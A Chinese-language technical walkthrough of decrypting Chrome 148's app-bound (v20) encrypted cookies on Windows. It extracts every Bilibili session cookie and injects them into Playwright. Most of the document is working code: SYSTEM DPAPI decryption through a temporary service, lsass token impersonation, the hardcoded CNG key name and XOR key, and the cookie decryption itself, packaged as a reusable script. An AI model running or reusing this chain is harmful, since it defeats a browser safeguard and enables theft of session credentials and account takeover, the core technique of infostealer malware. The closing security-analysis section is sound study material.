# Chrome v20 Cookie 解密完整技术总结

> 2026-05-21 | 成功从本地 Chrome 148.0.7778.168 提取 B 站全部 23 个 Cookie

## 一、背景与目标

Chrome 从 127 版本开始引入 **Application-Bound Encryption (ABE)**，Cookie 数据库中 `encrypted_value` 字段从 v10（DPAPI）升级到 v20（多层加密）。目标是绕过这套加密，拿到明文 Cookie 用于自动化。

## 二、加密架构全貌

Chrome v20 的加密分为两层：**Cookie 加密** 和 **Key 加密**。

### Cookie 加密层

Cookie 数据库（SQLite）中每个 Cookie 的 `encrypted_value` 字段格式：

```
[v20前缀:3字节] [IV:12字节] [密文:变长] [Tag:16字节]
```

- 前缀 `v20`（hex: `763230`）标识加密版本
- 使用 AES-256-GCM 对称加密
- 密文 = AES-GCM(明文Cookie, AES_master_key, IV)
- **前 32 字节是域名完整性校验哈希，实际 Cookie 值从第 33 字节开始**

### Key 加密层（5 层嵌套）

AES master key 不是明文存储的，而是经过 5 层保护：

```
第1层: Local State 文件 (JSON)
  └── os_crypt.app_bound_encrypted_key (Base64 字符串)
        │
第2层: Base64 解码
  └── 去掉前4字节 "APPB" 标识
        │
第3层: SYSTEM DPAPI 解密 (需要 NT AUTHORITY\SYSTEM 权限)
  └── 得到一个 DPAPI blob（描述: "Google Chrome"）
        │
第4层: 用户 DPAPI 解密 (当前登录用户)
  └── 得到结构化数据: [header_len:4][header][content_len:4][flag:1][数据...]
        │
第5层: CNG KSP 解密 + XOR 混淆
  ├── flag=0x01: AES-256-GCM, 硬编码 key (Chrome <133)
  ├── flag=0x02: ChaCha20-Poly1305, 硬编码 key (Chrome 133-136)
  └── flag=0x03: AES-256-GCM, CNG key + XOR key (Chrome 137+)
        │
最终: AES master key (32字节)
```

## 三、完整解密流程

### Step 1: 确认环境

```python
import os, json

# Chrome 版本
chrome_dir = r"C:\Program Files\Google\Chrome\Application"
print(os.listdir(chrome_dir))  # ['148.0.7778.168', ...]

# Cookie 数据库位置
cookie_db = os.path.join(os.environ["LOCALAPPDATA"],
    r"Google\Chrome\User Data\Default\Network\Cookies")
print(os.path.exists(cookie_db))  # True
print(os.path.getsize(cookie_db))  # ~1MB

# Local State 位置
local_state = os.path.join(os.environ["LOCALAPPDATA"],
    r"Google\Chrome\User Data\Local State")
```

**注意**：Chrome 运行时会独占锁死 Cookie 文件，必须先关闭 Chrome。

### Step 2: 读取 app_bound_encrypted_key

```python
with open(local_state, "r", encoding="utf-8") as f:
    state = json.load(f)

# os_crypt 中有两个 key:
# - encrypted_key: v10 旧格式（DPAPI 直接解密）
# - app_bound_encrypted_key: v20 新格式（多层加密）
key_b64 = state["os_crypt"]["app_bound_encrypted_key"]
key_bytes = base64.b64decode(key_b64)

print(key_bytes[:4])  # b'APPB' -- 标识头
inner = key_bytes[4:]  # 去掉 APPB，剩余 640 字节
```

### Step 3: SYSTEM DPAPI 解密

**问题**：`app_bound_encrypted_key` 用 SYSTEM DPAPI 加密，普通管理员调用 `CryptUnprotectData` 会报错 `NTE_BAD_KEY_STATE (0x8009000B)`。即使用 `CRYPTPROTECT_SYSTEM=0x1` flag 也不行，因为管理员不是 SYSTEM。

**解法**：创建临时 Windows 服务，以 SYSTEM 身份运行解密脚本。

**worker 脚本**（`decrypt_as_system.py`）：

```python
import os, json, base64, ctypes, ctypes.wintypes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))]

# 读取 key
state = json.load(open(
    r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State",
    "r", encoding="utf-8"))
inner = base64.b64decode(state["os_crypt"]["app_bound_encrypted_key"])[4:]

# SYSTEM DPAPI 解密
crypt32 = ctypes.windll.crypt32
inp = DATA_BLOB(len(inner), ctypes.create_string_buffer(inner, len(inner)))
out = DATA_BLOB()
result = crypt32.CryptUnprotectData(
    ctypes.byref(inp), None, None, None, None,
    0x1,  # CRYPTPROTECT_SYSTEM
    ctypes.byref(out))

# 写结果到临时文件（跨进程传递）
result_file = r"%TEMP%\chrome_v20_key.txt"
with open(result_file, "w") as f:
    if result:
        blob = ctypes.string_at(out.pbData, out.cbData)
        ctypes.windll.kernel32.LocalFree(out.pbData)
        f.write(f"SUCCESS|{len(blob)}|{blob.hex()}")
    else:
        f.write(f"FAILED|{ctypes.GetLastError()}")
```

**创建并执行服务**（管理员 cmd）：

```bat
@echo off
:: 创建服务，binPath 指向 Python 解释器 + 脚本
sc create ChromeDecrypt binPath= "C:\Path\To\python.exe C:\Path\To\decrypt_as_system.py" type= own start= demand

:: 启动服务（以 SYSTEM 身份运行脚本）
sc start ChromeDecrypt

:: 等待脚本执行完成
ping -n 6 127.0.0.1 >nul

:: 清理服务
sc stop ChromeDecrypt
sc delete ChromeDecrypt
```

**结果传递方式**：worker 脚本将解密结果写入固定的临时文件路径，主进程读取该文件获取结果。格式为 `STATUS|LENGTH|HEX_DATA`。

**执行结果**：

```
[SC] CreateService 成功
[SC] StartService 成功（虽然超时报 1053，但脚本已执行）
```

读取结果文件：

```
SUCCESS|384|01000000d08c9ddf0115d1118c7a00c04fc297eb...
```

成功拿到 384 字节的 SYSTEM DPAPI 解密后的 blob。

### Step 4: 用户 DPAPI 二次解密

SYSTEM DPAPI 解密出来的 blob 本身还是一个 DPAPI 数据包，需要当前用户再解密一次：

```python
import win32crypt

system_blob = bytes.fromhex("01000000d08c9ddf...")  # 384 bytes
desc, user_blob = win32crypt.CryptUnprotectData(system_blob, None, None, None, 0)

print(desc)        # "Google Chrome"
print(len(user_blob))  # 132 bytes
print(user_blob.hex())
# 1f000000 02 433a5c50726f6772616d2046696c65735c476f6f676c655c4368726f6d65 5d000000 03 ...
```

### Step 5: 解析 Key Blob 结构

二次解密后的 132 字节数据结构（参考 [runassu/chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption)）：

```python
import struct, io

buffer = io.BytesIO(user_blob)

header_len = struct.unpack('<I', buffer.read(4))[0]  # 31
header = buffer.read(header_len)  # Chrome 安装路径相关
content_len = struct.unpack('<I', buffer.read(4))[0]  # 93
flag = buffer.read(1)[0]  # 0x03

print(f"header_len={header_len}, content_len={content_len}, flag={flag}")
# header_len=31, content_len=93, flag=3
```

flag 含义：
- `0x01` → Chrome <133, AES-256-GCM, key 硬编码在 elevation_service.exe
- `0x02` → Chrome 133-136, ChaCha20-Poly1305, key 硬编码
- `0x03` → Chrome 137+, AES-256-GCM, key 在 CNG KSP 中

Chrome 148 的 flag = 0x03，属于最新格式。

flag=0x03 时，后续数据布局：

```
[encrypted_aes_key:32字节] [IV:12字节] [ciphertext:32字节] [tag:16字节]
```

```python
encrypted_aes_key = buffer.read(32)
iv = buffer.read(12)
ciphertext = buffer.read(32)
tag = buffer.read(16)
```

### Step 6: CNG KSP 解密 encrypted_aes_key

**问题**：`encrypted_aes_key` 用 Windows CNG (Cryptography Next Generation) Key Storage Provider 加密。需要找到正确的 key 名称。

**定位 key 名称的过程**：

最初猜测了多个名称，全部返回 `NTE_BAD_KEY_STATE (0x80090016)`：
- `"Google Chrome Elevation Service"` ❌
- `"Chrome Elevation Service"` ❌
- `"Chrome App-Bound Encryption"` ❌
- `"Google Chrome"` ❌

**最终来源**：在 GitHub 项目 [runassu/chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption) 的源码中找到了答案：

```python
# 来自 runassu/chrome_v20_decryption/decrypt_chrome_v20_cookie.py
hKey = gdef.NCRYPT_KEY_HANDLE()
key_name = "Google Chromekey1"  # ← 就是这个
status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0x40)
```

关键点：
- key 名称是 `"Google Chromekey1"`（注意没有空格，不是 "Google Chrome key1"）
- 必须使用 `NCRYPT_MACHINE_KEY_FLAG = 0x40` 标志（机器级 key，不是用户级）

**CNG 解密代码**：

```python
import ctypes
ncrypt = ctypes.windll.NCRYPT

# 打开 KSP Provider
hProv = ctypes.c_void_p()
ncrypt.NCryptOpenStorageProvider(
    ctypes.byref(hProv),
    "Microsoft Software Key Storage Provider",  # 标准软件 KSP
    0
)

# 打开 Chrome 的 key
hKey = ctypes.c_void_p()
ncrypt.NCryptOpenKey(hProv, ctypes.byref(hKey), "Google Chromekey1", 0, 0x40)

# 第一次调用：获取输出缓冲区大小
pcbResult = ctypes.c_ulong(0)
input_buf = (ctypes.c_ubyte * 32).from_buffer_copy(encrypted_aes_key)
ncrypt.NCryptDecrypt(hKey, input_buf, 32, None, None, 0, ctypes.byref(pcbResult), 0x40)

# 第二次调用：实际解密
output_buf = (ctypes.c_ubyte * pcbResult.value)()
ncrypt.NCryptDecrypt(hKey, input_buf, 32, None, output_buf, pcbResult.value, ctypes.byref(pcbResult), 0x40)

cng_decrypted = bytes(output_buf[:pcbResult.value])
print(f"CNG decrypted: {cng_decrypted.hex()}")
# 例如: 15d86b4609dc23d293031ed1...

# 清理
ncrypt.NCryptFreeObject(hKey)
ncrypt.NCryptFreeObject(hProv)
```

**注意**：`NCryptDecrypt` 需要调用两次——第一次传 `None` 获取输出大小，第二次实际解密。flag `0x40` 是 `NCRYPT_MACHINE_KEY_FLAG`。

### Step 7: XOR 混淆得到最终 AES Key

CNG 解密出来的还不是最终 key，需要和一个硬编码的 32 字节 XOR key 异或：

**XOR key 的来源**：同样来自 [runassu/chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption) 项目，通过逆向 Chrome 的 `elevation_service.exe` 提取。

```python
xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")

aes_master_key = bytes([a ^ b for a, b in zip(cng_decrypted, xor_key)])
print(f"AES master key: {aes_master_key.hex()}")
# d910c78bcaaea43dcc3f...
```

这个 XOR key 是 Chrome 137+ 特有的，不同版本的 key 和 XOR 值不同：

| Chrome 版本 | flag | 加密方式 | Key 来源 | XOR Key |
|-------------|------|----------|----------|---------|
| <133 | 0x01 | AES-256-GCM | elevation_service.exe 硬编码 | 无 |
| 133-136 | 0x02 | ChaCha20-Poly1305 | 硬编码 key | 无 |
| 137+ | 0x03 | AES-256-GCM | CNG KSP | `CCF8A1C...` |

### Step 8: AES-GCM 解密 Cookie

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

cipher = AESGCM(aes_master_key)

# Cookie 的 encrypted_value 格式:
# [v20:3] [iv:12] [ciphertext:变长] [tag:16]
enc_val = b"v20..."  # 从数据库读取
iv = enc_val[3:15]
ct = enc_val[15:-16]
tag = enc_val[-16:]

plaintext = cipher.decrypt(iv, ct + tag, None)
cookie_value = plaintext[32:].decode("utf-8")  # 前32字节是完整性哈希，跳过
```

## 四、解密验证结果

成功解密 B 站全部 23 个 Cookie：

| Cookie 名 | 域名 | 用途 | 示例值 |
|-----------|------|------|--------|
| SESSDATA | .bilibili.com | 登录 session | `xxxxxxxx%2Cxxxxxx%2C...` |
| bili_jct | .bilibili.com | CSRF token | `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` |
| DedeUserID | .bilibili.com | 用户 ID | `123456789` |
| DedeUserID__ckMd5 | .bilibili.com | 用户 ID 校验 | `xxxxxxxxxxxxxxxx` |
| buvid3 | .bilibili.com | 设备标识 | `BE59F53F-320C-35C2-...` |
| buvid4 | .bilibili.com | 设备指纹 | `7A2503C9-24A0-F463-...` |
| bili_ticket | .bilibili.com | JWT ticket | `eyJhbGciOiJIUzI1NiIs...` |
| _uuid | .bilibili.com | 浏览器 UUID | `EFEDFA3A-F2A10-...` |
| sid | .bilibili.cn | session ID | `oy1mg0d8` |

关键 Cookie 说明：
- **SESSDATA**：最重要的登录凭证，等价于密码，泄露 = 账号被盗
- **bili_jct**：CSRF 防护 token，发弹幕/评论/点赞等操作需要
- **DedeUserID**：数字用户 ID，API 请求需要

## 五、Cookie 注入 Playwright

拿到解密 Cookie 后，注入 Playwright 实现自动化：

```python
import json, asyncio
from playwright.async_api import async_playwright

COOKIES_FILE = "bilibili_cookies.json"

async def main():
    # 1. 读取 Cookie
    with open(COOKIES_FILE, "r", encoding="utf-8") as f:
        raw_cookies = json.load(f)

    # 2. 转换为 Playwright 格式
    pw_cookies = []
    for c in raw_cookies:
        pw_cookies.append({
            "name": c["name"],
            "value": c["value"],
            "domain": c["domain"],
            "path": "/",
        })

    # 3. 启动浏览器并注入
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context()
        await context.add_cookies(pw_cookies)

        # 4. 验证登录状态
        page = await context.new_page()
        await page.goto("https://www.bilibili.com", wait_until="domcontentloaded")
        await page.wait_for_timeout(3000)

        # 5. 调用 API 验证
        resp = await page.evaluate("""async () => {
            const r = await fetch('https://api.bilibili.com/x/web-interface/nav', {
                credentials: 'include'
            });
            return await r.json();
        }""")

        if resp.get("code") == 0:
            info = resp["data"]
            print(f"登录成功: {info['uname']} (UID: {info['mid']})")
        else:
            print(f"未登录: {resp.get('message')}")

        await browser.close()

asyncio.run(main())
```

**验证结果**：

```
登录成功: 用户名 (UID: 123456789)
```

## 六、完整脚本

最终封装为一个可复用脚本，支持命令行参数：

```bash
# 提取指定域名
python decrypt_cookies.py --domain bilibili.com

# 提取所有
python decrypt_cookies.py

# 指定输出
python decrypt_cookies.py --domain bilibili.com --output cookies.json

# 指定 Profile
python decrypt_cookies.py --domain bilibili.com --chrome-profile "Profile 1"
```

脚本位于：`.claude/skills/chrome-cookie-decryptor/scripts/decrypt_cookies.py`

使用了 `PythonForWindows` 库的 `impersonate_lsass()` 方法来获取 SYSTEM 权限，比手动创建 Windows 服务更优雅：

```python
from contextlib import contextmanager
import windows, windows.crypto, windows.generated_def as gdef

@contextmanager
def impersonate_lsass():
    """通过 lsass.exe 的 token 获取 SYSTEM 权限"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

# 使用
with impersonate_lsass():
    decrypted = windows.crypto.dpapi.unprotect(encrypted_data)
```

## 七、踩坑全记录

| # | 问题 | 原因 | 解法 | 耗时 |
|---|------|------|------|------|
| 1 | Cookie 文件读不了 | Chrome 运行时 `ERROR_SHARING_VIOLATION` 独占锁 | 关闭 Chrome | 5min |
| 2 | SQLite 只读模式打不开 | WAL 日志也被锁 | - | - |
| 3 | esentutl /y 复制失败 | 权限不足 | - | - |
| 4 | `CryptUnprotectData` 返回 0x8009000B | NTE_BAD_KEY_STATE，需要 SYSTEM 权限 | 创建 Windows 服务 | 20min |
| 5 | schtasks 运行结果为空 | SYSTEM 用户的路径和环境变量不同 | 使用绝对路径 + 写结果到固定文件 | 10min |
| 6 | browser_cookie3 解密失败 | 不支持 v20，只处理 v10 DPAPI | 手动实现 | 5min |
| 7 | rookiepy 安装失败 | Rust 编译错误 | 用 PythonForWindows 替代 | 2min |
| 8 | NCryptOpenKey 返回 0x80090016 | key 名称猜错了 | 在 runassu 项目源码中找到 `"Google Chromekey1"` | 30min |
| 9 | v10 key 解密 v20 cookie 失败 | MAC check failed，key 不同 | 需要用 v20 完整链路 | 5min |
| 10 | Cookie 值有乱码 | 前 32 字节是完整性校验哈希 | `plaintext[32:]` 跳过 | 2min |

## 八、依赖安装

```bash
pip install PythonForWindows pycryptodome cryptography pywin32
```

各依赖作用：
- `PythonForWindows`：lsass impersonation + DPAPI 解密
- `pycryptodome`：AES-GCM / ChaCha20 解密（备选）
- `cryptography`：AESGCM 解密 Cookie
- `pywin32`：`win32crypt.CryptUnprotectData` 用户 DPAPI

## 九、失败尝试汇总（完整排查过程）

在找到正确方案之前，尝试了大量失败的路径：

### 9.1 文件读取类（全失败）

| 方案 | 结果 | 原因 |
|------|------|------|
| `sqlite3.connect()` 直连 | `unable to open database file` | Chrome 持有排他文件锁 |
| `sqlite3` URI `?mode=ro&immutable=1` | 同上 | OS 级锁，SQLite 层无法绕过 |
| `sqlite3` URI `?nolock=1` | 同上 | 同上 |
| Python `open()` 直接读 | 读到 0 字节 | 文件大小返回 0 |
| `ctypes.CreateFileW` + `FILE_FLAG_BACKUP_SEMANTICS` | `ERROR_SHARING_VIOLATION (32)` | Chrome 排他锁 |
| `ctypes.CreateFileW` + 所有 sharing flags | 0 字节 | 锁住了 |
| `esentutl /y` 复制 | 超时/无输出 | 工具被 Chrome 锁阻塞 |
| `PowerShell Copy-Item` | `IOException` | 文件被占用 |
| `cmd /c copy` | 无输出 | 同上 |
| SQLite WAL 模式 | 没有 WAL 文件 | Chrome 用 journal 模式 |

**结论**：Chrome 运行时，没有任何方法能读取 Cookie 数据库，必须关闭 Chrome。

### 9.2 Chrome 连接类（全失败）

| 方案 | 结果 | 原因 |
|------|------|------|
| CDP 远程调试 `localhost:9222` | 连上了但不是 Chrome | 9222 端口被 Adobe UXP 占用 |
| `tasklist` 查 Chrome 进程 | 有进程但无调试端口 | Chrome 未开启 `--remote-debugging-port` |
| Playwright `launch_persistent_context` | `TargetClosedError` | 用户数据目录被运行中的 Chrome 锁住 |
| 启动新 Chrome 实例 + 调试端口 | `ERR_CONNECTION_REFUSED` | user-data-dir 被占用无法启动 |

### 9.3 解密 key 类（部分失败）

| 方案 | 结果 | 原因 |
|------|------|------|
| `win32crypt.CryptUnprotectData`（用户 DPAPI） | `NTE_BAD_KEY_STATE (0x8009000B)` | 数据是 SYSTEM DPAPI 加密的 |
| `CryptUnprotectData` + `CRYPTPROTECT_SYSTEM=0x1` | 同上 | 管理员不是 SYSTEM，没有 SE_TRUST_CRED_BASE_NAME |
| 用 v10 key 解密 v20 Cookie | `MAC check failed` | v10 key 和 v20 key 完全不同 |
| `NCryptOpenKey("Google Chrome Elevation Service")` | `0x80090016` | 名称猜错了 |
| `NCryptOpenKey("Chrome Elevation Service")` | `0x80090016` | 同上 |
| `NCryptOpenKey("Chrome")` | `0x80090016` | 同上 |
| `NCryptOpenKey("Google Chrome")` | `0x80090016` | 同上 |
| `NCryptEnumKeys` 枚举所有 key | Segfault | 结构体指针解析错误 |

**最终成功的组合**：`NCryptOpenKey("Google Chromekey1", 0x40)` — 名称来自 runassu 项目源码。

### 9.4 第三方库类（全失败）

| 库 | 结果 | 原因 |
|------|------|------|
| `rookiepy` | 安装失败 | Rust 编译错误（Python 3.14 不兼容） |
| `browser_cookie3` 0.20.1 | 解密失败 | 只支持 v10 DPAPI，不支持 v20 ABE |
| `pycookiecheat` | 不支持 Windows | 只支持 macOS/Linux |
| `shadowcopy`（browser_cookie3 内置） | 未触发 | Chrome 锁的不是 NTFS 级别 |

## 十、v10 Key 提取（对比实验）

在尝试 v20 解密之前，先成功提取了 v10 key，但发现它不能解密 v20 Cookie。

### Local State 文件中的两个 Key

```python
state["os_crypt"]
# {
#   "app_bound_encrypted_key": "QVBQQgEAAAD...",  ← v20 key (644 bytes base64)
#   "encrypted_key": "RFBBUEkBAAAA...",             ← v10 key
#   "audit_enabled": True
# }
```

### v10 Key 提取（成功）

```python
import base64, win32crypt

key_b64 = state["os_crypt"]["encrypted_key"]
key_bytes = base64.b64decode(key_b64)
print(key_bytes[:5])  # b'DPAPI' ← 标识头

v10_key = win32crypt.CryptUnprotectData(key_bytes[5:], None, None, None, 0)[1]
print(f"v10 key: {v10_key.hex()[:40]}... len={len(v10_key)}")
# v10 key: 22cd0bca685e7f6e81400817061020c1a5a101c2... len=32
```

### 用 v10 Key 解密 v20 Cookie（失败）

```python
from Cryptodome.Cipher import AES

# Cookie 前缀是 v20，尝试用 v10 key 解密
nonce = enc_value[3:15]
ciphertext = enc_value[15:-16]
tag = enc_value[-16:]
aes = AES.new(v10_key, AES.MODE_GCM, nonce=nonce)
data = aes.decrypt_and_verify(ciphertext, tag)
# ValueError: MAC check failed ← 密钥不匹配
```

**结论**：v10 key 只能解密 v10 格式的 Cookie（Chrome <80 生成的旧 Cookie），不能解密 v20。两个 key 完全独立。

## 十一、132 字节 Blob 逐字节解析

用户 DPAPI 解密后的完整 hex dump：

```
1f000000 02 433a5c50726f6772616d2046696c65735c476f6f676c655c4368726f6d65
^        ^  ^
|        |  └── "C:\Program Files\Google\Chrome" (ASCII)
|        └── 路径中某字节（可能是版本相关标识）
└── header_len = 0x1f = 31（小端序）

5d000000 03 681452e342c406ba33433a33
^        ^  ^
|        |  └── IV: 681452e342c406ba33433a33 (12 bytes)
|        └── flag = 0x03 (Chrome 137+ AES-256-GCM + CNG)
└── content_len = 0x5d = 93（小端序）

2bd8f21a95a52992c5ca7da1bfc7562d971a14fea8349c5357b77fcdb75268e2
└── encrypted_aes_key (32 bytes) ← 用 CNG + XOR 解密

ff3d59a1807dea982c30fc9898599f46
└── GCM tag for the blob (16 bytes)

e82904ca402260d6d31a0fa6ee17ece9088f46a2fdddba7d3589cd8939bfe647
└── 剩余数据（可能是额外的完整性校验或填充）
```

**结构化表示**：

| 偏移 | 长度 | 字段 | 值 |
|------|------|------|-----|
| 0 | 4 | header_len | 31 |
| 4 | 31 | header (Chrome path) | `...Chrome` + padding |
| 35 | 4 | content_len | 93 |
| 39 | 1 | flag | 0x03 |
| 40 | 12 | IV | `681452e3...` |
| 52 | 32 | encrypted_aes_key | `2bd8f21a...` |
| 84 | 16 | tag | `ff3d59a1...` |
| 100 | 32 | 剩余 | `e82904ca...` |
| **合计** | **132** | | |

## 十二、安全启示

这套解密链路暴露了几个安全设计问题：

1. **ABE 的保护边界有限**：虽然增加了 SYSTEM 权限要求，但本地管理员通过 lsass impersonation 可以绕过
2. **CNG key 名称是硬编码的**：`"Google Chromekey1"` 一旦被逆向发现，保护形同虚设
3. **XOR key 也是硬编码的**：和 CNG key 一样，写在 `elevation_service.exe` 二进制中
4. **Cookie 以明文形式在内存中存在**：Chrome 解密后会缓存，恶意软件可以 dump 内存
5. **SESSDATA 等价于密码**：B 站的 session cookie 不绑定设备/指纹，拿到就能完全控制账号

对比：Firefox 使用独立的 key4.db + 完整的 AES-CBC 加密，没有 ABE 的多层嵌套，但也没有 SYSTEM 级保护。

## 十三、参考资料

- [runassu/chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption) — 关键来源，提供了 CNG key 名称和 XOR key
- [Chromium 源码 elevator.cc](https://github.com/chromium/chromium/blob/35afbc6f6b81d51d697ea615364a972832dab418/chrome/elevation_service/elevator.cc#L199) — Chrome 加密实现
- [VoidStealer 分析](https://blog.csdn.net/OPHKVPS/article/details/159725284) — ABE 绕过原理
- [From DPAPI to Chrome (aliyun)](https://xz.aliyun.com/news/19124) — DPAPI 机制详解
